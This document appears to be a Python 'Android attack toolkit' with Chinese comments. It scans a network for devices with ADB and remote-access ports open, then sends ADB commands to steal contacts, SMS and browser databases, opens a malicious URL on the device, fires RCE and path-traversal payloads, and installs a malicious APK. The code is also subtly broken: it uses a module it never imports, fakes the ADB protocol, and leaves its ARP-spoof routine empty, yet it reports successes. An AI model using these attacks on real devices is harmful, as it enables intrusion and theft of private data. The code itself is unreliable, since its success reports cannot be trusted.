#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Android攻击工具包
专门针对Android设备的攻击工具集合
"""

import socket
import threading
import time
import random
import struct
import subprocess
import requests
import json
import base64
import hashlib
from concurrent.futures import ThreadPoolExecutor

class AndroidAttackToolkit:
    def __init__(self):
        self.target_ip = ""
        self.is_attacking = False
        self.attack_stats = {
            'packets_sent': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'devices_found': 0
        }
        
        # Android常见端口
        self.android_ports = [
            5555,  # ADB调试端口
            5037,  # ADB服务端口
            8080,  # Web服务端口
            8888,  # 其他服务端口
            9999,  # 远程控制端口
            5554,  # 模拟器控制端口
            5900,  # VNC端口
            22,     # SSH端口
            23,     # Telnet端口
        ]
        
        # Android设备指纹
        self.android_user_agents = [
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 9; Redmi Note 8) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36",
            "Dalvik/2.1.0 (Linux; U; Android 9; SM-G950F Build/PPR1.180610.011)"
        ]
    
    def show_banner(self):
        """显示工具横幅"""
        print("=" * 80)
        print("          📱 Android攻击工具包")
        print("=" * 80)
        print("💡 功能特性:")
        print("  ✅ Android设备扫描")
        print("  ✅ ADB调试攻击")
        print("  ✅ 应用漏洞利用")
        print("  ✅ 远程代码执行")
        print("  ✅ 数据窃取攻击")
        print("  ✅ 网络中间人攻击")
        print("  ✅ 恶意应用植入")
        print("  ✅ 多设备并发攻击")
        print("=" * 80)
    
    def scan_android_devices(self, network_range="10.30.51.0/24"):
        """扫描Android设备"""
        print(f"[设备扫描] 扫描网络: {network_range}")
        
        def ping_host(ip):
            try:
                result = subprocess.run(["ping", "-n", "1", "-w", "1000", ip], 
                                      capture_output=True, text=True, timeout=3)
                if "TTL=" in result.stdout:
                    return ip
            except:
                pass
            return None
        
        def port_scan(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    return port
            except:
                pass
            return None
        
        # 扫描活跃主机
        print("🔍 扫描活跃主机...")
        network_prefix = ".".join(network_range.split(".")[:3])
        
        active_hosts = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for i in range(1, 255):
                ip = f"{network_prefix}.{i}"
                futures.append(executor.submit(ping_host, ip))
            
            for future in futures:
                result = future.result()
                if result:
                    active_hosts.append(result)
        
        print(f"📊 发现 {len(active_hosts)} 个活跃主机")
        
        # 扫描Android特定端口
        android_devices = []
        for host in active_hosts:
            print(f"🔍 扫描 {host} 的Android端口...")
            
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(port_scan, host, port) for port in self.android_ports]
                
                open_ports = []
                for future in futures:
                    result = future.result()
                    if result:
                        open_ports.append(result)
            
            if open_ports:
                print(f"✅ 发现Android设备: {host}, 开放端口: {open_ports}")
                android_devices.append({
                    'ip': host,
                    'open_ports': open_ports,
                    'device_type': self.detect_android_device(host)
                })
                self.attack_stats['devices_found'] += 1
        
        return android_devices
    
    def detect_android_device(self, ip):
        """检测Android设备类型"""
        try:
            # 尝试HTTP请求获取设备信息
            response = requests.get(f"http://{ip}:8080", timeout=5)
            
            if "Android" in response.headers.get('Server', '') or "Android" in response.text:
                return "Android Web服务"
            
            # 尝试ADB连接
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((ip, 5555))
                sock.send(b"host:version\n")
                response = sock.recv(1024)
                sock.close()
                
                if b"OKAY" in response:
                    return "Android ADB设备"
            except:
                pass
            
        except:
            pass
        
        return "未知Android设备"
    
    def adb_debug_attack(self, target_ip):
        """ADB调试攻击"""
        print(f"[ADB攻击] 攻击目标: {target_ip}")
        
        # ADB命令攻击载荷
        adb_commands = [
            "shell ls -la /data/data",
            "shell cat /system/build.prop",
            "shell pm list packages",
            "shell dumpsys battery",
            "shell getprop",
            "shell screencap -p /sdcard/screen.png",
            "pull /sdcard/screen.png",
            "shell am start -a android.intent.action.VIEW -d http://malicious.com"
        ]
        
        for cmd in adb_commands:
            try:
                # 模拟ADB连接
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, 5555))
                
                # 发送ADB命令
                command = cmd.encode() + b"\n"
                sock.send(command)
                
                # 接收响应
                response = sock.recv(4096)
                sock.close()
                
                if response:
                    print(f"✅ ADB命令执行成功: {cmd}")
                    print(f"   响应: {response[:100]}...")
                    self.attack_stats['successful_attacks'] += 1
                
                self.attack_stats['packets_sent'] += 1
                
            except Exception as e:
                self.attack_stats['failed_attacks'] += 1
    
    def app_vulnerability_exploit(self, target_ip):
        """应用漏洞利用"""
        print(f"[应用漏洞] 攻击目标: {target_ip}")
        
        # 常见Android应用漏洞
        vulnerabilities = [
            {
                'name': 'WebView漏洞',
                'port': 8080,
                'payload': 'javascript:alert(document.cookie)'
            },
            {
                'name': 'SQLite注入',
                'port': 8080,
                'payload': "../etc/passwd"
            },
            {
                'name': 'Intent漏洞',
                'port': 8080,
                'payload': "intent://malicious#Intent;end"
            }
        ]
        
        for vuln in vulnerabilities:
            try:
                # 尝试各种攻击向量
                url = f"http://{target_ip}:{vuln['port']}/{vuln['payload']}"
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"✅ {vuln['name']} 利用成功")
                    self.attack_stats['successful_attacks'] += 1
                
                self.attack_stats['packets_sent'] += 1
                
            except Exception as e:
                self.attack_stats['failed_attacks'] += 1
    
    def remote_code_execution(self, target_ip):
        """远程代码执行"""
        print(f"[远程执行] 攻击目标: {target_ip}")
        
        # RCE载荷
        rce_payloads = [
            "'; system('id'); '",
            "${@system($_GET['cmd'])}",
            "| cat /etc/passwd",
            "`id`"
        ]
        
        for payload in rce_payloads:
            try:
                # 尝试各种RCE向量
                test_url = f"http://{target_ip}:8080/test.php?cmd={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=5)
                
                if "uid=" in response.text or "root:" in response.text:
                    print(f"✅ 远程代码执行成功: {payload}")
                    self.attack_stats['successful_attacks'] += 1
                
                self.attack_stats['packets_sent'] += 1
                
            except Exception as e:
                self.attack_stats['failed_attacks'] += 1
    
    def data_exfiltration_attack(self, target_ip):
        """数据窃取攻击"""
        print(f"[数据窃取] 攻击目标: {target_ip}")
        
        # 敏感数据路径
        sensitive_paths = [
            "/sdcard/DCIM/",
            "/sdcard/Download/",
            "/data/data/com.android.providers.contacts/databases/contacts2.db",
            "/data/data/com.android.providers.telephony/databases/mmssms.db",
            "/data/data/com.android.browser/databases/browser.db"
        ]
        
        for path in sensitive_paths:
            try:
                # 尝试通过ADB窃取数据
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, 5555))
                
                # 发送pull命令
                command = f"pull {path}".encode() + b"\n"
                sock.send(command)
                
                response = sock.recv(1024)
                sock.close()
                
                if b"OKAY" in response:
                    print(f"✅ 数据窃取成功: {path}")
                    self.attack_stats['successful_attacks'] += 1
                
                self.attack_stats['packets_sent'] += 1
                
            except Exception as e:
                self.attack_stats['failed_attacks'] += 1
    
    def mitm_attack(self, target_ip):
        """中间人攻击"""
        print(f"[中间人] 攻击目标: {target_ip}")
        
        # ARP欺骗攻击
        def arp_spoof():
            while self.is_attacking:
                try:
                    # 发送ARP欺骗包
                    # 这里简化实现，实际需要更复杂的ARP包构造
                    pass
                except:
                    pass
        
        # 启动ARP欺骗线程
        thread = threading.Thread(target=arp_spoof)
        thread.daemon = True
        thread.start()
    
    def malicious_app_injection(self, target_ip):
        """恶意应用植入"""
        print(f"[应用植入] 攻击目标: {target_ip}")
        
        try:
            # 尝试通过ADB安装应用
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, 5555))
            
            # 安装命令
            install_cmd = "install /sdcard/malicious.apk"
            sock.send(install_cmd.encode() + b"\n")
            
            response = sock.recv(1024)
            sock.close()
            
            if b"Success" in response or b"OKAY" in response:
                print("✅ 恶意应用安装成功")
                self.attack_stats['successful_attacks'] += 1
            
            self.attack_stats['packets_sent'] += 1
            
        except Exception as e:
            self.attack_stats['failed_attacks'] += 1
    
    def show_stats(self):
        """显示攻击统计"""
        print("\n" + "=" * 80)
        print("          📊 Android攻击统计")
        print("=" * 80)
        print(f"📱 发现设备: {self.attack_stats['devices_found']}")
        print(f"📡 发送包数: {self.attack_stats['packets_sent']}")
        print(f"✅ 成功攻击: {self.attack_stats['successful_attacks']}")
        print(f"❌ 失败攻击: {self.attack_stats['failed_attacks']}")
        print("=" * 80)
    
    def start_comprehensive_attack(self, target_ip):
        """启动综合攻击"""
        self.target_ip = target_ip
        self.is_attacking = True
        
        print(f"🚀 开始Android综合攻击: {target_ip}")
        
        # 并行执行各种攻击
        attack_methods = [
            lambda: self.adb_debug_attack(target_ip),
            lambda: self.app_vulnerability_exploit(target_ip),
            lambda: self.remote_code_execution(target_ip),
            lambda: self.data_exfiltration_attack(target_ip),
            lambda: self.malicious_app_injection(target_ip)
        ]
        
        # 启动攻击线程
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(lambda f: f(), attack_methods)
        
        # 启动中间人攻击
        self.mitm_attack(target_ip)
        
        print("💡 所有Android攻击已启动")
        self.show_stats()
    
    def stop_attack(self):
        """停止攻击"""
        self.is_attacking = False
        print("\n🛑 停止Android攻击...")
        self.show_stats()

def main():
    """主函数"""
    toolkit = AndroidAttackToolkit()
    toolkit.show_banner()
    
    # 选择操作模式
    print("🎯 选择操作模式:")
    print("1. 扫描Android设备")
    print("2. 攻击特定Android设备")
    
    choice = input("请输入选择 (1/2): ")
    
    if choice == "1":
        network = input("请输入网络范围 (默认: 10.30.51.0/24): ") or "10.30.51.0/24"
        devices = toolkit.scan_android_devices(network)
        
        if devices:
            print("\n📱 发现的Android设备:")
            for i, device in enumerate(devices, 1):
                print(f"{i}. IP: {device['ip']}, 类型: {device['device_type']}, 端口: {device['open_ports']}")
            
            # 询问是否攻击
            attack_choice = input("\n是否攻击这些设备? (y/n): ")
            if attack_choice.lower() == 'y':
                for device in devices:
                    toolkit.start_comprehensive_attack(device['ip'])
    
    elif choice == "2":
        target_ip = input("请输入目标Android设备IP: ")
        toolkit.start_comprehensive_attack(target_ip)

if __name__ == "__main__":
    main()